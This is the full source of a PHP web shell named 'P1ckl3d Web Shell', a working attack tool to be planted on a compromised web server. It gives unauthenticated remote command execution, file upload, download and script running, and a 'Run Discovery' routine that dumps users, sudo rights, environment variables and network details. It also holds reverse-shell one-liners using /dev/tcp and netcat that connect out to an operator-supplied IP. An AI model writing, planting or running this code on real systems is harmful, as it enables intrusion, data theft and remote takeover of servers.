<?php
session_start();

// Handle file upload
if (isset($_FILES['fileUpload'])) {
    $current_directory = $_SESSION['current_directory'];
    $target_file = $current_directory . '/' . basename($_FILES['fileUpload']['name']);
    if (move_uploaded_file($_FILES['fileUpload']['tmp_name'], $target_file)) {
        echo json_encode([
            "status" => "success",
            "message" => basename($_FILES['fileUpload']['name']) . " uploaded successfully",
            "directory" => $current_directory
        ]);
    } else {
        echo json_encode([
            "status" => "error",
            "message" => basename($_FILES['fileUpload']['name']) . " upload failed",
            "directory" => $current_directory
        ]);
    }
    exit;
}

// Handle file download
if (isset($_POST['downloadFile'])) {
    $current_directory = $_SESSION['current_directory'];
    $file_name = basename($_POST['downloadFile']);
    $file_path = $current_directory . '/' . $file_name;

    if (file_exists($file_path)) {
        $file_content = base64_encode(file_get_contents($file_path));
        echo json_encode([
            "status" => "success",
            "message" => $file_name . " ready for download",
            "fileContent" => $file_content,
            "directory" => $current_directory
        ]);
    } else {
        echo json_encode([
            "status" => "error",
            "message" => $file_name . " does not exist",
            "directory" => $current_directory
        ]);
    }
    exit;
}

// Handle running scripts
if (isset($_POST['runScript']) && isset($_POST['engine']) && isset($_POST['scriptContent'])) {
    $engine = $_POST['engine'];
    $script_content = $_POST['scriptContent'];

    // Create a temporary script file
    $temp_file = tempnam(sys_get_temp_dir(), 'script');
    file_put_contents($temp_file, $script_content);

    // Determine the command to run based on the engine
    $command = '';
    switch ($engine) {
        case 'bash':
            $command = "bash $temp_file";
            break;
        case 'python':
            $command = "python $temp_file";
            break;
        case 'python2':
            $command = "python2 $temp_file";
            break;
        case 'python3':
            $command = "python3 $temp_file";
            break;
        case 'perl':
            $command = "perl $temp_file";
            break;
        default:
            echo json_encode([
                "status" => "error",
                "message" => "Invalid script engine",
                "output" => ""
            ]);
            unlink($temp_file);
            exit;
    }

    // Execute the command and capture the output
    $output = shell_exec($command . ' 2>&1');
    unlink($temp_file);

    echo json_encode([
        "status" => "success",
        "output" => $output ? $output : 'No output'
    ]);
    exit;
}

// Handle Run Discovery
if (isset($_POST['runDiscovery'])) {
    $hostname = executeCommand('hostname');
    $osInfo = executeCommand('uname -a');
    $kernelVersion = executeCommand('uname -r');
    $phpVersion = phpversion();
    $serverSoftware = $_SERVER['SERVER_SOFTWARE'];
    $currentUser = executeCommand('whoami');
    $detailedUserInfo = executeCommand('id');
    $userAccounts = executeCommand('cut -d: -f1 /etc/passwd');
    $sudoPrivileges = executeCommand('sudo -l');
    $environmentVariables = executeCommand('printenv');
    $networkConfig = executeCommand('ifconfig');
    $openPorts = executeCommand('netstat -tuln');
    $activeConnections = executeCommand('netstat -antp');
    $listeningServices = executeCommand('ss -tulwn');
    $sshConnections = executeCommand('ss -tn src :22');
    $firewallStatus = executeCommand('ufw status');
    $selinuxStatus = executeCommand('sestatus');
    $runningProcesses = executeCommand('ps aux');
    $installedPackages = executeCommand('dpkg -l');
    $installedServices = executeCommand('systemctl list-unit-files --type=service');
    $dockerContainers = executeCommand('docker ps');
    $cpuInfo = executeCommand('lscpu');
    $memoryUsage = executeCommand('free -h');
    $diskUsage = executeCommand('df -h');
    $uptime = executeCommand('uptime');
    $scheduledCronJobs = executeCommand('crontab -l');
    $rootdir = executeCommand('ls /');
    $recursiveLs = executeCommand('ls -R /var/www');
    $UsersHome = executeCommand('ls -R /home');
    $misconfigurations = executeCommand('find / -type f -perm 0777 2>/dev/null');
    $coreDumps = executeCommand('find / -name core -type f 2>/dev/null');
    $openFiles = executeCommand('lsof');
    $lastLoggedUsers = executeCommand('last');

    $discoveryData = [
        "Hostname" => $hostname["output"],
        "Operating System Info" => $osInfo["output"],
        "Kernel Version" => $kernelVersion["output"],
        "PHP Version" => $phpVersion,
        "Server Software" => $serverSoftware,
        "Current User" => $currentUser["output"],
        "Detailed User Info" => $detailedUserInfo["output"],
        "User Accounts" => $userAccounts["output"],
        "Sudo Privileges" => $sudoPrivileges["output"],
        "Environment Variables" => $environmentVariables["output"],
        "Network Configuration" => $networkConfig["output"],
        "Open Ports" => $openPorts["output"],
        "Active Connections" => $activeConnections["output"],
        "Listening Services" => $listeningServices["output"],
        "SSH Connections" => $sshConnections["output"],
        "Firewall Status" => $firewallStatus["output"],
        "SELinux Status" => $selinuxStatus["output"],
        "Running Processes" => $runningProcesses["output"],
        "Installed Packages" => $installedPackages["output"],
        "Installed Services" => $installedServices["output"],
        "Docker Containers" => $dockerContainers["output"],
        "CPU Info" => $cpuInfo["output"],
        "Memory Usage" => $memoryUsage["output"],
        "Disk Usage" => $diskUsage["output"],
        "System Uptime" => $uptime["output"],
        "Scheduled Cron Jobs" => $scheduledCronJobs["output"],
        "Root Directory Listing" => $rootdir["output"],
        "Recursive Directory Listing of /var/www" => $recursiveLs["output"],
        "Recursive Directory Listing of Home" => $UsersHome["output"],
        "World-Writable Files" => $misconfigurations["output"],
        "Core Dumps" => $coreDumps["output"],
        "Open Files" => $openFiles["output"],
        "Last Logged Users" => $lastLoggedUsers["output"],
        "Current Directory" => $_SESSION['current_directory']
    ];

    echo json_encode($discoveryData);
    exit; // Exit to only return the output for the AJAX request
}

// Function to execute shell commands in the current directory
function executeCommand($command) {
    $current_directory = $_SESSION['current_directory'];
    chdir($current_directory);

    if (substr($command, 0, 3) === 'cd ') {
        $dir = trim(substr($command, 3));
        if (chdir($dir)) {
            $_SESSION['current_directory'] = getcwd();
            return ["output" => "Changed directory to " . $_SESSION['current_directory'], "directory" => $_SESSION['current_directory']];
        } else {
            return ["output" => "Failed to change directory to " . $dir, "directory" => $_SESSION["current_directory"]];
        }
    } else {
        $output = shell_exec($command . ' 2>&1'); // Added '2>&1' to capture errors
        $_SESSION['current_directory'] = getcwd(); // Update the current directory
        return ["output" => $output ? $output : 'Command failed', "directory" => $_SESSION['current_directory']];
    }
}

// Get the current directory for display
$current_directory = $_SESSION['current_directory'];

// Check if a custom command was submitted via AJAX
if (isset($_POST['customCommand'])) {
    $customCommand = $_POST['customCommand'];
    $response = executeCommand($customCommand);
    echo json_encode($response);
    exit; // Exit to only return the output for the AJAX request
}

// Handle request to get the current directory
if (isset($_POST['getCurrentDirectory'])) {
    echo json_encode(["directory" => $current_directory]);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>P1ckl3d Web Shell</title>
    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #2e2e2e;
            color: #ffffff;
            font-family: Arial, sans-serif;
        }
        .center {
            text-align: center;
        }
        .output-container {
            margin-top: 20px;
            max-width: 60%;
            margin-left: auto;
            margin-right: auto;
            text-align: left;
        }
        .form-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }
        input[type="text"], input[type="number"] {
            width: 60%;
            padding: 10px;
            font-size: 16px;
            color: #00ff00;
            background-color: #333333;
            border: 1px solid #555555;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        input[type="text"]:focus, input[type="number"]:focus {
            outline: 2px solid #00ff00;
        }
        input[type="submit"], button {
            padding: 10px 20px;
            font-size: 16px;
            color: #ffffff;
            background-color: #555555;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        h2 {
            cursor: pointer;
            color: #00ff00; /* Green color for command headings */
        }
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            background-color: #1e1e1e;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #444444;
        }
        .collapsed::before {
            content: '▶';
            display: inline-block;
            margin-right: 5px;
        }
        .expanded::before {
            content: '▼';
            display: inline-block;
            margin-right: 5px;
        }
        h1 {
            font-family: 'VT323', monospace;
            font-size: 3em;
        }
        .separator {
            border: 2px solid #00ff00;
            margin: 20px 0;
            max-width: 60%;
            margin-left: auto;
            margin-right: auto;
        }
        .buttons-container {
            display: flex;
            justify-content: center;
        }
        .burger-menu {
            position: fixed;
            top: 10px;
            right: 10px;
            cursor: pointer;
            z-index: 1000;
        }
        .burger-menu div {
            width: 25px;
            height: 3px;
            background-color: #00ff00;
            margin: 5px;
            transition: 0.4s;
        }
        .menu-content {
            display: none;
            position: fixed;
            top: 40px;
            right: 10px;
            background-color: #2e2e2e;
            border: 1px solid #555555;
            padding: 10px;
            border-radius: 5px;
            z-index: 1000;
        }
        .menu-content a {
            color: #ffffff;
            padding: 8px 12px;
            text-decoration: none;
            display: block;
        }
        .menu-content a:hover {
            background-color: #555555;
        }
        .modal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #2e2e2e;
            padding: 20px;
            border-radius: 5px;
            border: 1px solid #555555;
            z-index: 2000;
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header h2 {
            margin: 0;
        }
        .modal-body {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 10px;
        }
        .modal-body ul {
            list-style: none;
            padding: 0;
        }
        .modal-body li {
            padding: 5px;
            cursor: pointer;
        }
        .modal-body li:hover {
            background-color: #555555;
        }
        .close-button {
            cursor: pointer;
            background-color: #555555;
            color: #ffffff;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
        }
        #scriptFileInput {
            display: none;
        }
    </style>
    <script>
        function getScriptName() {
            const scripts = document.getElementsByTagName('script');
            return scripts[scripts.length - 1].src.split('/').pop();
        }

        function runCustomCommand() {
            const command = document.getElementById('customCommand').value;
            const scriptName = getScriptName();
            const xhr = new XMLHttpRequest();
            xhr.open('POST', scriptName, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    const commandOutput = document.createElement('div');
                    commandOutput.innerHTML = '<h2 class="expanded" onclick="toggleVisibility(this.nextElementSibling)">' + command + '</h2><pre>' + response.output + '</pre>';
                    const outputContainer = document.getElementById('customCommandOutput');
                    outputContainer.insertBefore(commandOutput, outputContainer.firstChild);

                    // Update the current directory
                    document.getElementById('currentDirectory').innerText = response.directory;
                }
            };
            xhr.send('customCommand=' + encodeURIComponent(command));
            document.getElementById('customCommand').value = '';
            return false; // Prevent form submission
        }

        function runDiscovery() {
            const scriptName = getScriptName();
            const xhr = new XMLHttpRequest();
            xhr.open('POST', scriptName, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    const discoveryOutput = document.getElementById('discoveryOutput');
                    discoveryOutput.innerHTML = '';

                    for (const [key, value] of Object.entries(response)) {
                        if (key !== 'Current Directory') {
                            const header = document.createElement('h2');
                            header.classList.add('collapsed');
                            header.innerText = key;
                            header.onclick = function() {
                                toggleVisibility(this.nextElementSibling);
                            };
                            const pre = document.createElement('pre');
                            pre.style.display = 'none';
                            pre.innerText = value;
                            discoveryOutput.appendChild(header);
                            discoveryOutput.appendChild(pre);
                        } else {
                            document.getElementById('currentDirectory').innerText = value;
                        }
                    }

                    // Fade out the Run Discovery menu item
                    const runDiscoveryLink = document.querySelector('#menuContent a[data-action="runDiscovery"]');
                    runDiscoveryLink.style.opacity = '0.5';
                    runDiscoveryLink.style.pointerEvents = 'none';
                }
            };
            xhr.send('runDiscovery=true');
        }

        function toggleVisibility(element) {
            if (element.style.display === 'none') {
                element.style.display = 'block';
                element.previousElementSibling.className = 'expanded';
            } else {
                element.style.display = 'none';
                element.previousElementSibling.className = 'collapsed';
            }
        }

        function updateCurrentDirectory() {
            const scriptName = getScriptName();
            const xhr = new XMLHttpRequest();
            xhr.open('POST', scriptName, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    document.getElementById('currentDirectory').innerText = response.directory;
                }
            };
            xhr.send('getCurrentDirectory=true');
        }

        function toggleMenu() {
            const menu = document.getElementById('menuContent');
            if (menu.style.display === 'none' || menu.style.display === '') {
                menu.style.display = 'block';
            } else {
                menu.style.display = 'none';
            }
        }

        function uploadFile() {
            const fileInput = document.getElementById('fileUploadInput');
            const formData = new FormData();
            formData.append('fileUpload', fileInput.files[0]);

            const xhr = new XMLHttpRequest();
            xhr.open('POST', getScriptName(), true);
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    const commandOutput = document.createElement('div');
                    commandOutput.innerHTML = '<h2 class="expanded" onclick="toggleVisibility(this.nextElementSibling)">File Upload</h2><pre>' + response.message + '</pre>';
                    const outputContainer = document.getElementById('customCommandOutput');
                    outputContainer.insertBefore(commandOutput, outputContainer.firstChild);
                }
            };
            xhr.send(formData);
        }

        function showFileList() {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', getScriptName(), true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    const modalBody = document.getElementById('modalBody');
                    modalBody.innerHTML = '';

                    const files = response.output.split('\n');
                    const ul = document.createElement('ul');
                    files.forEach(file => {
                        if (file) {
                            const li = document.createElement('li');
                            li.innerText = file;
                            li.onclick = function() {
                                downloadFile(file);
                            };
                            ul.appendChild(li);
                        }
                    });

                    modalBody.appendChild(ul);
                    document.getElementById('fileListModal').style.display = 'block';
                }
            };
            xhr.send('customCommand=' + encodeURIComponent('ls -A1'));
        }

        function downloadFile(fileName) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', getScriptName(), true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    const commandOutput = document.createElement('div');
                    commandOutput.innerHTML = '<h2 class="expanded" onclick="toggleVisibility(this.nextElementSibling)">File Download</h2><pre>' + response.message + '</pre>';
                    const outputContainer = document.getElementById('customCommandOutput');
                    outputContainer.insertBefore(commandOutput, outputContainer.firstChild);

                    // Handle file download
                    if (response.status === 'success') {
                        const link = document.createElement('a');
                        link.href = 'data:application/octet-stream;base64,' + response.fileContent;
                        link.download = fileName;
                        link.click();
                    }
                }
            };
            xhr.send('downloadFile=' + encodeURIComponent(fileName));
        }

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        function showRunScriptModal() {
            document.getElementById('runScriptModal').style.display = 'block';
        }

        function selectScriptEngine(engine) {
            document.getElementById('scriptEngine').value = engine;
            document.getElementById('scriptFileInput').click();
        }

        function runScript() {
            const fileInput = document.getElementById('scriptFileInput');
            const engine = document.getElementById('scriptEngine').value;

            if (fileInput.files.length > 0) {
                const file = fileInput.files[0];
                const reader = new FileReader();

                reader.onload = function(e) {
                    const scriptContent = e.target.result;
                    const xhr = new XMLHttpRequest();
                    xhr.open('POST', getScriptName(), true);
                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                    xhr.onreadystatechange = function () {
                        if (xhr.readyState == 4 && xhr.status == 200) {
                            const response = JSON.parse(xhr.responseText);
                            const commandOutput = document.createElement('div');
                            commandOutput.innerHTML = '<h2 class="expanded" onclick="toggleVisibility(this.nextElementSibling)">' + engine + ' script</h2><pre>' + response.output + '</pre>';
                            const outputContainer = document.getElementById('customCommandOutput');
                            outputContainer.insertBefore(commandOutput, outputContainer.firstChild);
                        }
                    };
                    xhr.send('runScript=true&engine=' + encodeURIComponent(engine) + '&scriptContent=' + encodeURIComponent(scriptContent));
                };

                reader.readAsText(file);
            }
        }

        function showReverseShellModal() {
            document.getElementById('reverseShellModal').style.display = 'block';
        }

        function spawnReverseShell(shellCommand) {
            const ip = document.getElementById('shellIp').value;
            const port = document.getElementById('shellPort').value;
            const command = shellCommand.replace('10.10.10.10', ip).replace('9001', port);

            const xhr = new XMLHttpRequest();
            xhr.open('POST', getScriptName(), true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    const response = JSON.parse(xhr.responseText);
                    const commandOutput = document.createElement('div');
                    commandOutput.innerHTML = '<h2 class="expanded" onclick="toggleVisibility(this.nextElementSibling)">Reverse Shell</h2><pre>' + response.output + '</pre>';
                    const outputContainer = document.getElementById('customCommandOutput');
                    outputContainer.insertBefore(commandOutput, outputContainer.firstChild);
                }
            };
            xhr.send('customCommand=' + encodeURIComponent(command));
            closeModal('reverseShellModal');
        }

        document.addEventListener('DOMContentLoaded', function () {
            document.getElementById('customCommand').addEventListener('keypress', function (e) {
                if (e.key === 'Enter') {
                    runCustomCommand();
                    e.preventDefault(); // Prevent form submission
                }
            });
            document.getElementById('fileUploadInput').addEventListener('change', uploadFile);
            document.getElementById('scriptFileInput').addEventListener('change', runScript);
            updateCurrentDirectory(); // Initial update of the current directory
        });
    </script>
</head>
<body>
    <h1 class="center">P1ckl3d Web Shell</h1>

    <div class="burger-menu" onclick="toggleMenu()">
        <div></div>
        <div></div>
        <div></div>
    </div>

    <div id="menuContent" class="menu-content">
        <a href="#" onclick="document.getElementById('fileUploadInput').click()">Upload File</a>
        <a href="#" onclick="showFileList()">Download File</a>
        <a href="#" onclick="showRunScriptModal()">Run Script</a>
        <a href="#" onclick="runDiscovery()" data-action="runDiscovery">Run Discovery</a>
        <a href="#" onclick="showReverseShellModal()">Spawn Reverse Shell</a>
    </div>

    <div class="center">
        <p>Current Directory: <span id="currentDirectory"></span></p>
    </div>

    <form id="uploadForm" style="display:none">
        <input type="file" id="fileUploadInput" name="fileUpload">
    </form>

    <form id="scriptForm" style="display:none">
        <input type="file" id="scriptFileInput">
        <input type="hidden" id="scriptEngine">
    </form>

    <!-- Custom Command Form -->
    <div class="center">
        <div class="form-container">
            <input type="text" id="customCommand" name="customCommand" size="50">
            <div class="buttons-container">
                <input type="submit" value="Run Command" onclick="runCustomCommand()">
            </div>
        </div>
    </div>

    <!-- Custom Command Output -->
    <div id="customCommandOutput" class="output-container"></div>

    <!-- Separator -->
    <hr class="separator">

    <!-- Discovery Output -->
    <div id="discoveryOutput" class="output-container"></div>

    <!-- File List Modal -->
    <div id="fileListModal" class="modal">
        <div class="modal-header">
            <h2>Select a file to download</h2>
            <button class="close-button" onclick="closeModal('fileListModal')">Close</button>
        </div>
        <div class="modal-body" id="modalBody"></div>
    </div>

    <!-- Run Script Modal -->
    <div id="runScriptModal" class="modal">
        <div class="modal-header">
            <h2>Select a script engine</h2>
            <button class="close-button" onclick="closeModal('runScriptModal')">Close</button>
        </div>
        <div class="modal-body">
            <ul>
                <li onclick="selectScriptEngine('bash')">bash</li>
                <li onclick="selectScriptEngine('python')">python</li>
                <li onclick="selectScriptEngine('python2')">python2</li>
                <li onclick="selectScriptEngine('python3')">python3</li>
                <li onclick="selectScriptEngine('perl')">perl</li>
            </ul>
        </div>
    </div>

<<!-- Reverse Shell Modal -->
<div id="reverseShellModal" class="modal">
    <div class="modal-header">
        <h2>Spawn Reverse Shell</h2>
        <button class="close-button" onclick="closeModal('reverseShellModal')">Close</button>
    </div>
    <div class="modal-body">
        <input type="text" id="shellIp" placeholder="Enter your IP">
        <input type="number" id="shellPort" placeholder="Enter your port">
        <ul>
            <li onclick="spawnReverseShell('sh -i >& /dev/tcp/10.10.10.10/9001 0>&1')">Standard Bash</li>
            <li onclick="spawnReverseShell('nc 10.10.10.10 9001 -e /bin/sh')">Netcat</li>
        </ul>
    </div>
</div>

</body>
</html>
